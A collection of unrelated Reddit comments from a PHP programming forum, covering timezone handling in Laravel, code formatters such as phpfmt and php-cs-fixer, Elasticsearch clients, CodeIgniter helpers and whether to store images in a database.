I was working with Symfony a while ago and was able to use on save and on load events to automatically convert timestamps. I haven't worked with Laravel for a while, but maybe this post could help you out... http://laravel.io/forum/11-27-2014-handling-dates-with-form-models
This, exactly this. The talks don't ever cover something so in depth that you couldn't Google it. The hard part, is knowing what to Google. Conferences are a great way to get exposed to different ideas and different ways of doing things. It's sometimes easy to keep your head down and focus on working, and I found a conference a great eye opener to a whole bunch of new things.
&gt; What I'm trying to achieve is some kind of global handling of this so all model dates are converted automatically. When storing the timestamp, store it as UTC. If you think the zone information is important, store it separately. Some databases have a `TIMESTAMP WITH TIMEZONE` data type, which is safe to use, but simply standardizing everything on UTC makes things less complicated. When dealing with the timestamp PHP-side, use DateTime or DateTimeImmutable. Don't handle timestamp strings yourself. When rendering the DateTime, it's just a matter of passing a DateTimeZone to the [`setTimeZone`](http://us2.php.net/manual/en/datetime.settimezone.php) method of the DateTime (or to the [counterpart in DateTimeImmutable](http://us2.php.net/manual/en/datetimeimmutable.settimezone.php) which returns a new instance). With the JS solution, you'll be delaying page rendering as you rewrite the times, and then have to deal with either third party code to handle timezones sanely in JS, or have to deal with JS time crap yourself... and that's a pain in the ass. With the server-side solution, you avoid all the JS mess, but you also have to already know the user's target timezone. This won't be a problem if you restrict viewing to logged in users, but if a non-trivial portion of your audience don't have accounts, then you might run into a usability issue solved by the JS solution. Another option might be using mainly relative times, like "30 minutes ago" and offering a fixed UTC timestamp as title text. 
Just write tests verifying the behavior you want and then implement the feature. Don't overthink this. Reasonable considerations: - If rendering logic is complex (eg depends on the client device), then return raw UTC times to the client and let them figure it out - For simple rendering, compute the desired format server-side and have the client simply render it. The client can indicate a desired format by communicating a locale or timezone preference, possibly implicitly (eg via the authorization header) - Stay DRY. A customizable trait decorating your toArray()'s seems reasonable. Declare localizable fields and have the trait auto-convert when rendering. 
Other than additional data types, are there other reasons to use Redis over Memcached?
Not this post again. There's a reason it was deleted from /r/netsec. Read the commentary here: https://www.reddit.com/r/netsec/comments/4dzn7a/panama_papers_leak_a_result_of_an_exploit_used/ 
i have compiled php7 in my machine and teached all my team to do it, we use the command php7 -S localhost:8000 To initialize our developing servers, but I want one server in php7 to offer clients after the development is over
https://gist.github.com/ligurio/f6114bd1df371047dd80ea9b8a55c104
&gt; When storing the timestamp, store it as UTC. Be aware that [that won't work for future times](http://www.creativedeletion.com/2015/03/19/persisting_future_datetimes.html). &gt; you also have to already know the user's target timezone If you do need anonymous user support you can approximate this for instance with geolocation.
This is how I feel
very good startup guide. That's exactly what I need.
You could fairly trivially write a PHP extension to expose the OpenBSD `pledge()` system call as a PHP function. It would probably only be useful for command-line code, though. PHP scripts sometimes execute in a process shared by other scripts, and using `pledge()` there could sabotage them.
As the talk says, OpenBSD is often more of a research system. Many of the applications and concepts originally developed in/by OpenBSD, especially security and stability related, eventually make their way to Linux. While the install base for OpenBSD may not be as high as Linux the fixes implemented in the code for problems picked up by these systems can benefit all the operating systems on which that code runs. As you and the talk point out, everyone loves to pay lip service to security - that's why optional security fails. Using this system, the programmer can enforce security restrictions (on themselves) in an extremely simple way. Any time they hit a place where they can't use a call, they're forced to make a decision: * Do they really need that call, or is there something better they could use? * Is this the right place to make that call? Or could they restructure the code to make this part of it simpler / more secure. By setting up a test environment with pledge on OpenBSD, projects can also enforce these restrictions on contributions (pull requests) they receive, which helps to audit those requests. I can certainly see this, or something very much like it, making its way to Linux before too long.
Just used Faker for the first time a few days ago. The realText() method is going to be especially useful for testing fulltext search. It generates real English paragraphs of text taken from Alice in Wonderland, using the "Markov chain algorithm" that swaps words around, but still looks like real sentences. Lorem ipsum isn't much good for testing stem words etc.
Not everyone uses PHPStorm..
just pointing it out for those who do. there is also a tool called php-cs-fixer https://github.com/FriendsOfPHP/PHP-CS-Fixer
the web server itself would not be able to access them. again, need more clarification on the end goal :-)
Is this really needed? Most IDEs I've used have had a "Format code" option
You don't need to do any changes in how you are going to persist date attributes: you will always store the UTC. What you need to worry about is how you are going to present these date attributes. I think you can use an accessors mutator for the date attributes: https://laravel.com/docs/5.1/eloquent-mutators#accessors-and-mutators In your mutator, you can make two accessors: one for viewing the time when have you the user timezone and the other one when you don't have it. That way you won't have to pass the User into the model but do the check in your view, something along those lines (I'm not expert in Laravel): public function getUTCTimeAttribute($dateInTimezone) { // do timezone coversion here return $dateInTimezone; } public function getUTCDefaultTimeAttribute($dateInTimezone) { // do timezone coversion here return $dateInTimezone; } Now in your views, you can do your check for which attribute to show based on connected user or not (you could write a view hlper for this so you don't have to do it everywhere). by the way, this is easily done in something using a data transofmer: https://symfony.com/doc/current/cookbook/form/data_transformers.html
http://kosinix.github.io/grafika/ - just another image manipulation lib
I see its benefit when used as a Git hook to ensure everyone's code looks the same.
It has the benefit of not needing to be run through an IDE.
What license is it supposed to be? 
I have used both. elastica doesn't have great documentation but a ton of tests you can look at for examples. the elastic search client last time I used it was just a glorified json wrapper which worked out but was a little clunky when you had to start building arrays of arrays. 
You configure your own standard &amp; sniffs in PHP CodeSniffer to accomplish this.
Haha yeah, I also tested my fulltext search on Alice in Wonderland thanks to Faker.
&gt; I mainly develope with .NET and Java, Do you use IntelliJ IDEA for Java? In that case you can just install PHP plugin for it. It has 99% features of PHPStorm.
If you pay for a year of subscription, you get a perpetual license for the current version, i.e. once your subscription ends, you can use a version that was out when you paid them forever.
Yeah... When I created this crap my dream was an unified format... I failed. Now I have to live with it. 
Is that a real license or a custom license ? How compatible is the project with gpl?
phpfmt converts from long to short arrays automatically for you. 
It's 3-clause BSD
Well... Quick enough to be used as plugin in sublime-phpfmt and not hang the editor. Comparatively, I had projects that php-cs-fixer takes almost an hour, and phpfmt takes 10min
[Producer](http://getproducer.org) checks for missing docblocks (`producer phpdoc`), but not for old-style arrays.
I should have kept my teeth together. 
Heya everyone. I'm a WordPress developer by day so my PHP skills have become somewhat outdated. I would love to hear any feedback on this Laravel library I created over the weekend for dealing with (crazy) EU VAT rules. Tests is what I struggle with most. I've started setting up tests for most methods and made sure all client classes for dealing with remote API's are mockable so tests don't hit remote servers. If there's a better way or you have a general tip, code style improvement, whatever: please let me know. Also, be kind please. :)
&gt; Psr-2 is a wonderful work of inconsistencies I understand some people think that. &gt; It is meaningless as a standard. Not really. For more, see &lt;http://paul-m-jones.com/archives/2420&gt;, such as: &gt; The brace rules are what the majority of member projects have already picked for themselves. (A minority of projects consistently put braces on the same line, and a different minority consistently put braces on the next line, but there was no majority that consistently put them in the same place.) So, plenty consistent, *and* useful as a standard.
That's not really the concern here. I realized I paid for a 1 mo sub and got 1 month out of it... 
Interesting, would you mind sharing the source?
Yeah. The point is, it's cheaper than IDEA for those that don't code in Java.
&gt; this is php in 2016 Least you require them and not make me have to go out and do it. And I agree with this. How ever it sounded like you were all like " Ya you install these core components your self..." And I was like "peace"
I also package out my stuff, as much as possible in order to keep components EXTREMLY small.
Question 1: because I think Coraline Ada is patrolling Internet against OSS that dont have a code of conduct. And people are actually getting into real troubles because of that. So I took her own code of covenant and changed it in a way that she cannot opalgate me. Question 2: because it is meant for PC patrols to see it. Question 3: once. Thanks for the suggestion, patches are welcome. But seriously, use php-cs-fixer. 
This is the best tool ever. I hate reading sloppy code where the equal signs done line up or the indentation is wrong. I feel like this should be implemented in all editors and run upon hitting save.
Yeah... That's the reason I created it. But I regret to have made it public. Now it's creating fragmentation in PHP ecosystem. Try php-cs-fixer - it's great too, higher bus factor and, internally, uses all of those industry good practices in its construction. They are doing an amazing job there. Although slower, I must say that I believe their implementation is better. 
Id rather see the fragmentation of "shitty looking code" (That disappears over time) to "I can read this, it should be refactored, but the indentation, alignment of variables and other such things make me be able to read this and not wanna go postal on the place"
You can't run any GUI natively
I took a quick look and it looks pretty good. I'd recommend style ci since its an open source project, it'll clean up your styles (they're a lil off). You can also do this manually with php-cs-fixer. Id also recommend coverage reporting and something that does phpmd, you can add this to Sublime or Atom with extensions, or use tools like Codacy / Codeclimate. md + cs = pretty code. More tests wouldn't hurt, aim for 90+% coverage. Good luck! 
Personally, I feel disappointed that I had to take this step. But my own protection is more important. 
well are you going to get fired because of this post?
OK. So PSR-2 is consistently inconsistent. It manages to be different among all its users, and yet allow then to say they're PSR-2 compliant. 
Who knows... All I need to do is to piss off one PC patrol person. 
It doesn't. It is a *php*fmt not a panacea for your problems.
You made it public. Go shout "penis" outside and then try to ask people not to think or talk about it. Sure, there may be consequences to releasing this that you have to deal with. If you didn't want people to talk about it, you probably shouldn't have released it or given it an open source license though. Those two things are literal, persistent indicators of the permission you give to people to talk about your software...
Your edit is bad and you should feel bad.
maybe take some concepts from your tool and make a PR for this other tool? I dunno.
Yeah. I guess you are right.
why not right? perhaps some time in future when I have more time to deal with them.
I've only been to PHPNW2015. I thought it was a mixed bag. Most of the talks were more educational orientated, but were too introductory for me and I didn't learn anything interesting nor were the speakers all that enthralling. The surprise stand out talk for me was [phpBB, Meet Symfony by Michael Cullum](https://www.youtube.com/watch?v=J4F16PLFUoc), which was an entertaining tale of how to modernise an ageing open source code base. I learnt nothing I can apply in my day job, but it was a fun listen.
Thank you and sorry for being lazy
I like the idea of split stack architecture, but this article just doesn't seem right to me. - Speed of javascript engines was not the reason pages weren't rendered using javascript. It was a huge pain to work with Javascript. - The entire section on "Independent Stacks" seems like filler. The first two sentences merely repeat each other. People can certainly building angular / react apps with a single LAMP code base. - Simultaneous development section does not contain anything specific to split stack development. Having a predefined list of data points will speed up development. This can be an documented JSON API or a document that says "a form will contain fields x, y, and z.". 
Try using the [Elasticsearch DSL](https://github.com/ongr-io/ElasticsearchDSL).
no, use autoloaded library, or maybe move to more modern framework :)
and yet a popular project like symfony has no such code of conduct and has certainly not been attacked at all for it. so basically, you're being riduculous.
Why not just scale it back?
Creating a helper is the quickest and easiest way to do it.
But I've used class-specific stuff like `$this-&gt;db-&gt;query("...")` in that function. Will that stuff work if it is a part of `require()` file instead of the main class?
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Please use https://github.com/commerceguys/tax
What if people will get hired because of it?
What exactly are you looking for? Shared hosting or a VPS? Do you have a specific location in mind? The hosting company I work for offers PHP7 on the shared hosting platform, on VPSs it kinda depends on the guest OS of course. We're in the Netherlands.
Wtf is 11-04-2016. Why do mods hate ISO 8601?
Or logical formatting.... 
the main answer is no, followed by suggestion to create CI library (or helper) then add it to autoload config also, create simple CI library will not make a lot of effort I suggest more modern framework because CI is rather obsolete
 public function GetPlayers( ) { return isset( $this-&gt;Players ) ? $this-&gt;Players : false; } [src:Github](https://github.com/xPaw/PHP-Minecraft-Query/blob/master/src/MinecraftQuery.php) This is the function that you are calling. If there are no players, instead of an empty array, false is returned. So your array_values call is given false instead of an array. A possible fix could look like this: require __DIR__ . '/src/MinecraftQuery.php'; require __DIR__ . '/src/MinecraftQueryException.php'; use xPaw\MinecraftQuery; use xPaw\MinecraftQueryException; $Query = new MinecraftQuery( ); $Query-&gt;Connect( '185.38.148.79', '28024' ); $array = ( $Query-&gt;GetPlayers( ) ); if ($array !== false) { echo json_encode(array_values($array)); } else { echo json_encode(array("NoPlayersFound")); } 
Lovely. The refreshing trolls of Reddit... 
Never seen it happen. Not impossible though. 
There's a sublime text plugin for php-cs-fixer. Check their page. 
[**@reinink**](https://twitter.com/reinink): &gt;[2016-04-11 10:13:04 UTC](https://twitter.com/reinink/status/719468301424832512) &gt;Poll: How do you typically organize your classes? Comparison found here: [*gist.github.com*](https://gist.github.com/reinink/504a9654c4348dbc0dc81ff4313fb588) ---- [^[Mistake?]](/message/compose/?to=TweetPoster&amp;subject=Error%20Report&amp;message=/4ea8wv%0A%0APlease leave above link unaltered.) [^[Suggestion]](/message/compose/?to=TweetPoster&amp;subject=Suggestion) [^[FAQ]](/r/TweetPoster/comments/13relk/) [^[Code]](https://github.com/joealcorn/TweetPoster) [^[Issues]](https://github.com/joealcorn/TweetPoster/issues) 
So, I don't normally share links to Twitter on /r/PHP, but I'm running a poll this morning which I think may be of interest to Reddit readers. I'd also love your input on it!
write a helper if you won't move frameworks, unless you need the functionality prior to the framework init. Also does CI even work past 5.4? Anyone tried with 7? I'd be interested to know if the framework has testing for this sort of thing for legacy apps. Oh FYI It's not about making new CI things, more interested in using legacy CI things.
Although it's based on Laravel 4.2 it tries to encapsulate most of the business logic in its own namespace under "app/Vimrcfu" so it should serve as a fairly generic example of OO PHP: https://github.com/florianbeer/vimrcfu Instructions on how to set it up for local development are in the readme file.
At work, maintaining/extending CI 3.0.6 application and I have been using PHP 7 almost since release. Have had 0 issues so far. This could be due to the application being largely forms-based and most of the logic is simple CRUD operations. Started the app using PHP 5.5.9 and since upgrading to 7.0.5, the app is noticeably faster.
Yeah I did consider that, seeing that Elasticsearch-PHP looks a bit like it just passes JSON on for you. But there's must be some reason that people use it? Looking to get going fairly quickly, so if Elasticsearch-PHP will help with that, I might as well use it I think. 
Yeah I'm bit a concerned about the lack of docs, so I'm leaning towards just using Elasticsearch-PHP seeing it doesn't seem to need you to learn much "library specific" stuff to do use it. So hopefully reading about ES from all sources would translate most of the time? What are you using now? Would you use something different if starting out again?
Is this something that you use on top of Elasticsearch-PHP? I took a bit of a look at it, but can't see what it adds compared to Elasticsearch-PHP or Elastica? Is it mainly used to generate JSON from PHP classes/methods? 
No, I don't believe there's anything like that. You're going to want to hire someone to build it for you. You could likely get it built in a couple of hours if that's as simple as it is
all of the base string commands dont work... you need mb_* functions. http://php.net/manual/en/ref.mbstring.php
you can always get one of those templates and replace the static values with twig variables. 
Preview never worked for me but I never lost my note either.
I have been working with Laravel since a year
Oh really :/
&gt; I understand that a PHP file is no more than a regular HTML file saved as ".php" where you can insert php code. No, that is technically not correct. You can save HTML in a file that gets processed by PHP and PHP will basically ignore all the content as long as it is not "encapsulated" in a "PHP section" (`&lt;?php ..... ?&gt;`) and outputs it unprocessed. Only the content in a PHP section will be processed. So yes, you CAN write HTML code in files that get processed by PHP, but PHP files are not "a regular HTML file". &gt; I believe the same applies for JavaScript (".js"). In a way. While files with the suffix `.php` get processed by PHP usually other file types are not processed by PHP. So you either need to add `.js` files to the list of files that get processed by PHP, or you need to store your JavaScript content into a file with `.php` suffix and then the same as described for HTML content applies. &gt; So how do you save the file when you have both JS and PHP integrated with your HTML? If you want to get your content processed by PHP you need to use `&lt;?php ..... ?&gt;` and the file you write the content into has to be on the "dear PHP, please process files with this suffixes" list on the server :) &gt; I've seen examples where they integrate the PHP directly into the HTML and other examples where they "call" an external .php program. Usually you don't see anything from PHP in the output your browser gets from the server. What you might have seen was a reference because of it's the target of a link, or a form, or generates an image as output for example and is used in `src` for an `img` tag. When you talk about actual PHP source code then you wil usually have `include()` or `require_once()` in your code for loading the given file name into the currently processed content during the processing via PHP.
Still on Elastica for now but if I had to start over, I'd definitely use the official client. There's just too much disconnect between elastica and the actual docs and it's definitely not obvious to me, an elastic search rookie who has only been using it for a couple of years. 
I would recommend using a library that has schema building already built in. why reinvent the wheel.
Install &amp; upgrade scripts would be a reasonable and very common use case.
Ideally your project shouldn't be creating tables on the fly. Something like https://github.com/robmorgan/phinx would provide database versioning + the ability to migrate to the newer version without having to write that detection logic yourself. This also allows your end users to manage their upgrade process.
Sweet thanks will do!
Thanks for your answer you've addressed all my questions. Getting me one step closer to my goal!
I still wouldn't trust doing so this way, maybe an UPGRADE-2.x.sql
I mean, I thought this was a thoughtful, helpful and generous comment. 
When are you planning on breaking the internets?
It's a personal preference. I like the team at Codacy, decent support (for a free plan) and has a nicer looking dashboard. Play with all the CI tools, there are a lot of options, or pick what your favorite package uses (what I often do). I am now making a private API so I built my own CI tools for style, md, phpunit, coverage, etc, all these online tools do is just give you a pretty UI for a dozen open source tools you an use freely, so they all basically do the same thing, it just comes down to the UI. 
Okay I definly will, but if I may ask, *why* isn't this the 'right' way. Because I am reinventing the wheel ? 
The page does not exist
I want to hear the story behind this post...
I wouldn't consider it a conflict of interest to mention what conference your company organizes, especially if you're disclaiming it. Unless you want to be anonymous of course.
It's not really reusable in your current config. - You have raw SQL in strings and no SQL builder which ends up being really hard to maintain. - MySQL has this functionality baked into it [execute create tables if it does not exist]. In this sense you are breaking single responsibility. Your PHP system now is doing the work of the Database. I could go on, but I think you get an idea of it. 
This is such a broad question, I'm not even sure how to answer it. Of course you would have to use a boolean somewhere - how else would you determine it? You could use a try/catch but of course you still need a boolean to determine whether or not to throw.
Yes: find an employer who understands the distinction between quantitative and qualitative aspects of reality.
i do have the user and everything i was just wondering how can i prevent a guest viewing the website from voting or commenting. or redirect him to signing up when he tries to upvote what i had in mind when was that if the user is logged in i would set it to true and allow voting. but what function can i use to make the guest vote not count? 
This is not a format issue, your post lacks vital content.
I would love to help you, but unfortunately in most programming languages there not usually functions as specific as "make the guest vote not count". A function to do that really depends entirely on what happens when a vote is counted. PHP itself does not provide any ways for users to go on a website to vote for something. You are most likely using a framework or content system that was written in PHP. This system is what performs the vote counting, not PHP. What you're asking is basically equivalent to "I just bought a car; how do I install a new radio?" You'd obviously need a lot more information than that to answer that question.
Why use PHP? Switch to Java and be happy!
I don't think you'll get something like that to work. PHP scripts will be executed as the apache (or nginx) user, not the user that logs into the web site. What you'd need to do is build an authentication and authorization layer into the script where end users can authenticate (htpasswd might be an acceptable solution, depending on your requirements), and the script will check whether the user is authorized to do the delete. Be forewarned, though, that this type of thing can open up a huge can of security worms. You'll need to be *extremely* careful about accepting user input (don't trust anything submitted by the user, including http headers), and the directories to be unlinked. Basically you want a whitelist of 'acceptable' values, and only execute the delete if the user input is on the whitelist, and then only execute a command that you control, not something taken from user input. Any thing else opens your device for hijacking. Honestly, if your script is creating or deleting directories on the fly there's almost certainly a better way to do it, although the better way will be significantly more complicated.
Instead of a cache like this: { "element": "value" } Do this: { "expiresAt": "date value here", "data": { "element": "value" } } Now, when you load that value, keep using it regardless of whether or not it's past the expiresAt time. However, queue off a background job (I like gearman) to repopulate the cache value. I like gearman because it has a unique job name feature which will automatically "dedupe" the job to be performed (refreshing the cache, that is). 
Only after every framework adopts it as a hard dependency for a few years.
They don't hate it. They only write it in reverse order for some stupid reason ...
Save to database -&gt; cron script to do the lifting? It hurts my face just thinking about it tho...
That's mentioned in the second paragraph. 
 &lt;?php function query($ip, $port) { use xPaw\{MinecraftQuery, MinecraftQueryException}; try { $q = new MinecraftQuery(); $q-&gt;Connect($ip, $port); $p = $q-&gt;GetPlayers(); return is_array($p) ? $p : []; } catch (MinecraftQueryException $e) { return []; } } function addNoPlayers($arr) { return is_empty($arr) ? ["No Players"] : $arr; } echo json_encode(addNoPlayers(query('185.38.148.79', '28024'));
So keep displaying the same data and shoot off a background job to populate it as it expires so there's no downtime. My main concern is mostly with user load during that period.
You average is wrong if you are not making money or it is driving clients away. Both of these things are the domain of your supervisor. Your job is to provide accurate estimates. If you have no feedback, assume that all is good. Of course you can always solicit feedback on those points. 
Right, and `mb_str_pad` doesn't exist.
Uninstall composer!
It would be interesting to re-run those benchmarks now. He cited a 10% improvement in performance, and I doubt -o was over 10% slower than PSR-4 autoloading.
Do you mean I shouldn't try this on a live production environment without backups? :p Don't worry, testing testing testing 1 2 3 4 5 6 and some more.
If you are doing this just to learn PHP/PDO on an internal project then it is fine. But if this is a project you are going to host on a webserver you dont really want a PHP program creating tables on the fly. Think of SQL as : - Data Definition Language (DDL) and - Data Manipulation Language (DML) where DDL is about creating your tables, indexes, foreign keys, triggers, stored procedures etc. and DML is about CREATE, SELECT, UPDATE and DELETE statements. Ideally DDL is done completely separate to your PHP programming , probably via a SQL script that you run using PHPMYADMIN or SQL Workbench or Toad etc., or possibly via a BASH script. Your PHP programs just do the DML using PDO (so INSERT, SELECT, UPDATE and DELETE statements). Make sure you read up on "PDO best practices" and how to avoid SQL injection attacks. If you are using a framework like Laravel you might want to use an ORM like Eloquent. Personally for over 20 years I prefer to stick with SQL but take a look and make your own decisions. 
Thanks a lot for the information, I'll be sure to read more. But say this is an app that I want my buddy to use, and it requires a database, but frankly my friend doesn't know how to setup a database that well, in fact, he barely knows any code. Will creating a table be okay in this case ?
Depends what you mean by "use". If you setup the database on the server, and configure the web server etc. then your friend can use your web app by typing in a URL to go to your site and run the html/css/php code. He should never need to create the database. The PHP code will connect to the database you created and issue SELECT and INSERT/UPDATE commands. I cannot think of a single web application I have ever created that needed a end user to create database tables on the fly. 
Hey thanks for chiming in! Lots of useful info there. For me getting started, I don't really need the round robin stuff yet, but will need it in the future (hopefully!). So while I am just looking to get started very simply right now, it would be good to learn something that will be useful long term on other projects too. I'm going to start with elasticsearch-php. The ability to pretty much just copy and paste ES JSON examples from any general ES guides without needing to translate into something PHP specific is appealing, and it just seems less complex in general for debugging etc. &lt;&lt;&lt; Does that make sense? Is what I'm saying there the biggest point of difference in the libraries? And having good documentation should help a lot too, seeing I'm totally new to ES. ***On a separate subject, just wondering if you had any opinions about this?..*** [Any thoughts on the index/type layout stuff I mentioned in this thread?](https://www.reddit.com/r/elasticsearch/comments/4dvddg/indexing_a_forum_website_in_elasticsearch_to/) There's a big response in there already that sounds like I'm mostly on track with what I was planning on doing. Just wondering if you had any thoughts on it too? After talking to the client, they actually want the comments within a single thread grouped together on the search results page. So I'm wondering if I should just chuck each entire whole thread into one "thread" document each (which includes all its comments), rather than having separate "comment" documents? A forum seems like a pretty common usage scenario for ES, but I haven't been able to find much on the web as examples. Thanks.
what if people think you're in special ed though.. 
- Long time ago: https://github.com/dannyvankooten/AltoRouter - Last weekend (WIP): https://github.com/dannyvankooten/laravel-vat
I suspect there's a balancing act between the two, but more generally, it'll probably be faster to have more methods per class (but as it seems you are aware, just for the record, you shouldn't design your classes and structure around how your language will read them faster, the difference will be too small).
PhpFM, I think I've seen that before ;) Unfortunately it's a little too powerful.
I would save images to the cloud (Amazon S3 or Cloudinary). Cloudinary is far superior to ANYTHING I have ever used due to it's flexibility with formatting images. **DB vs Server Argument** I prefer not to save in a DB and only have a column to indicate the path (eg. "picNum" with value "3"). Then when I need the image www. example .com/user887/thumb/3.jpg. This logic just seems easier to me. **Amazon S3** I used to save multiple copies of images to AWS S3 in a variety of different sizes. (eg. /thumb-65/3.jpg, /thumb-200/3.jpg... which would correspond to a 65px image and a 200px image). Because there's no point in using a 200px image when you only need a smaller one. However, I've since moved to Cloudinary for dynamic images. I still use S3 for static stuff (CSS, JS files) **Cloudinary** This service is outstanding. You save only one image and you can transform it into different sizes on the fly, crop it, format it, tweak contrast, brightness, optimize it, use facial recognition and can use browser uploading so its faster. They run it off Akamai CDN so it's just as fast as S3. **OVERALL** If you store an image in your database (or S3) you can only retrieve THAT image. With Cloudinary you can change everything AFTER you've uploaded it. If I previously had a 200px image and now I want one that is 150px x 100px, centers around the user's face and has a watermark... I can just create that transformation and it will show the image on the fly.
i wouldve introduced docker-compose, docker really isnt any fun and way too much information in a already oversaturated environment of devops for us puny developers ;) besides it starts becoming a necessity when dealing with multiple containers, OR multiple platforms of other projects. you want your shit to start and stop in the right order with just 1 command. i would also introduce a proper acl instead of letting users fock around with permissions post 'upping'
Indeed, but also most of the world does HH:MM:SS DD/MM/YY which is also in the wrong order, because you start with hours, get smaller (minutes and seconds) and then get bigger (days, months, years). ISO 8601 YYYY-MM-DDTHH:MM:SS one true date/time format!
Thanks for the info. For now, I will add a pre-permissions setting in the PHP Dockerfile GIST I created. This was literally a step by step guide as to how I personally created my containers and so I wanted to document everything I done in the hopes it will help others out. I have seen the docker-compose documentation, but haven't read up an awful lot about it. This is what I want to research and action next and once I have, I will document it in my Blog once again. I also want to research about creating a Lets Encrypt renewal cron job which runs the container every week. Similar to Digital Ocean's documentation, but obviously for Docker. :D Thank you for your input, it will help me improve my code and future posts. :) EDIT: I have updated my Dockerfile to automatically change the file permissions on the project. I will update the instructions on my Blog. :)
Cloudinary is awesome. Also similar, imgix.com is really, really nice. I actually started with Cloudinary but moved to Imgix because I find their API nicer. If you're not interested in a paid service, but want this sort of on-demand image manipulations, check out Glide: http://glide.thephpleague.com. It's a library I wrote, which was largely inspired by both Cloudinary and Imgix. I definitely would not save your images in the database. Save your originals either on disk, or even better on Amazon S3 (or equivalent), and then simply save the image url in the database. Then using something like Cloudinary, Imgix or Glide to generate the image sizes you need on the fly. Good luck!
I have seen PHP/javascript-ftp clients. You could login with userA (low privilege) on the website. There you provide a page with the online FTP-client interface that logs in as userX (high privilege). The client logs in automatically. In the FTP client interface the user can Copy/Move/Upload/Delete whatever.
Can you provide a non-bitly link?
That's What I'm asking. How can I prevent user from voting as a guest
If the class loading starts to become a hindrance, a good idea is to: * split the application (if possible) * separate processing into long-running workers (which don't need to autoload everything at every dispatch) * use a long-running app via an app-server container (PSR-7 ones started to appear, not sure how viable *yet*)
Of course. Just generally, use of URL shorteners is frowned upon on reddit because there's no real reason to use them here.
Thanks for the heads up, I didn't know that. :)
We (http://www.phparch.com) organize php[tek], php[world]. This year we're also doing php[cruise]. In February, our conference chair wrote about how we put together a schedule: http://phpa.me/feb-conf-planning That article might be relevant to discussions here about what goes into choosing speakers and talks, things like balancing basic versus more advanced talks, etc...
I have the one Cal Evans made, the black one with the purple letters. Im not ashamed to have it on my water bottle or laptop. 
Have a look to at the github discussion here to get some more context: https://github.com/composer/composer/pull/5174
Cool, I get to learn Travis now! Will do!
Autoloading with the not-yet-"static"-optimized classmap takes about 1-3ms in my application in PHP7 - this is already so low that optimizing your classes around it is pointless. What your application does (regular expressions, calculations) and external resources (DB, Redis, etc.) are much more likely to result in performance gains.
Ya its called WordPress. Make sure to allow it to autoupdate. Then people will be able to screw with you. That or Cpanel.......
&gt; the web server (apache/nginx) can serve the files directly rather than needing to execute PHP code and pull images out of the DB on every request, which is generally a huge waste of resources &gt; it doesn't clutter up the SQL backups, especially relevant if you don't want all files backed up, i.e. thumbnails and other copies. restoring backups quickly etc. mysqldumping GBs of images every day (or more often) would be insane. These are the two biggest reasons I don't use DB to store files. I also use Files because I can push them to a CDN easier of I wanted to do that like /u/Garethp said. 
Nice, I will look into imgix! Could you possibly answer the following: 1) Can you create custom transforms (eg. example.com?trans=my_trans) as opposed to a long url (example.com?w=200&amp;h=125&amp;fit=crop&amp;crop=entropy&amp;auto=format,enhance&amp;q=60) 2) I'm guessing there is some sort of client side uploading feature with progress bar implementation (javascript)? 3) One feature I would pay big bucks for is an enhancement tool. [Here's](http://cloudinary.com/addons#viesus_correct) the one in Cloudinary and [here's](https://docs.imgix.com/tutorials/auto-image-enhancement#) the one in ImgIX. HOWEVER, I've noticed that cloudinary only changes the image marginally. Is there some sort of service that will "photoshop" your images during upload (automated) or after (manual)? I would even pay per image if there's a 24hr turnaround. I need user uploaded images to look AMAZING (real estate photos) and the automated enhancement features can only go so far. **EDIT: Check this out https://www.misterclipping.com/
Nice to see this this is being adapted from a Laravel tool to a general purpose tool. I listened to the full stack radio interview recently, so cool to see it's happening!
These sound like almost valid concerns, until you realize that you don't have to use any of the new functions. You want to still write `function something($someParameter)`? Do so. PHP now has extra optional features to help make better code. Newcomers can still write simple code without worrying about them
Beginners and newcomers are good at avoiding code out of their skill level. PHP had OOP and Frameworks when I started, but before I knew much about OOP, it may not have even existed. There were tonnes of communities and resources out there, but I couldn't understand them so I quickly moved on to what I could understand. People are incredibly good at slowly learning the parts they can understand when it's wrapped in what they can't.
PHP has historically been picked up by inexperienced (often completely beginner) programmers. There is some validity to keeping the language simple so we can continue to pick up these programmers. However, *some* of these features should be more beginner friendly than what existed before. Having an explicit `...` instead of `func_get_args()` should make it easier to realize that this function actually takes parameters. Basically, the best features both make things simpler and more understandable.
Totally agree, however it's harder to google `...` than `func_get_args()`. Maybe this is something we can try and address with SEO optimization, an improved operator page, or including operators/keywords in search results on php.net? 
Where are you doing this? Is this typically in your bootstrap code?
[PHP is unfortunately the wrong technology](https://bugs.php.net/bug.php?id=40913) to store images in the database. But besides that, I see only uninformed opinions on this topic, mostly hovering around the performance argument. And yet none of them gives a substantial prove. [Here's an old paper](http://research.microsoft.com/apps/pubs/default.aspx?id=64525) researching that topic on SQL Server 2005. As you can see, the performance question cannot generally be answered. It depends very much on the product and the use case. DBS vendors do provide datatypes which are meant for large binary objects. Personally I trust them to do that right so that I don't worry about performance. Storing images on another medium adds unnecessary complexity to your code and to maintainance. Please do your stress tests and decide if there's a substantial difference which justifies the additional complexity. Having images in the database is so easy, having them on the filesystem gives you: - no ACID - one additional backup and recovery path - one additional migration path - one addtional system to monitor - you'll have to think about replicating your filesystem as well But as I said, PHP is the wrong technology for images in the database. Given the opinions on this topic by PHP developers I can understand why this bug is unresolved since almost 10 years.
Sadly, it will always be necessary - PHP never makes a major BC break, and changing this would literally turn all legacy PHP code into unusable garbage. It will never happen. What would make more sense, in my opinion, is a variation of the opening tag, e.g. `&lt;?php!` or something, which would default to modern settings - not only to `strict_types=1`, but also to `encoding='UTF-8'`, and perhaps eliminating the use of some legacy features and really bad practices. That'll never happen either though ;-) The [majority wants strict types](https://twitter.com/evertp/status/687408773946863616?ref_src=twsrc%5Etfw) and likely UTF-8, and obviously nobody wants all that garbage in the head of every single file. The fact that modern, de-facto standard, best practices have to be *opt-in* is terrible - in every single file you have to open with two lines of garbage just to say "look, my code doesn't suck!"... but I haven't been able to think of a solution that doesn't involve breaking/abandoning the current PHP codebase, and that's never going to fly. If anyone can think of a practical way to make this transition happen, I'd love to hear about it! 
`index.php`, `cli.php` or however you call it.
so really its not that scary?!
Well I'd make my company pay for [StyleCI](https://styleci.io/) if it supported Gitlab.
